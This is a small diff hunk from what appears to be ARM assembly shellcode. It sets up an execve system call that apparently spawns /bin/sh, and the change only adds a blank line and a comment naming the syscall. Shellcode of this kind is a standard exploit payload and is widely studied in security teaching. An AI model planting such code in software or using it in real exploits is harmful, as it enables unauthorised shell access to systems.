@@ -15,7 +15,8 @@ _start:
     eor r1, r1, r1
     eor r2, r2, r2
     strb r2, [r0, #7]
-    mov r7, #11
+
+    mov r7, #11 // SYS_execve
     swi #1
 
     binsh:
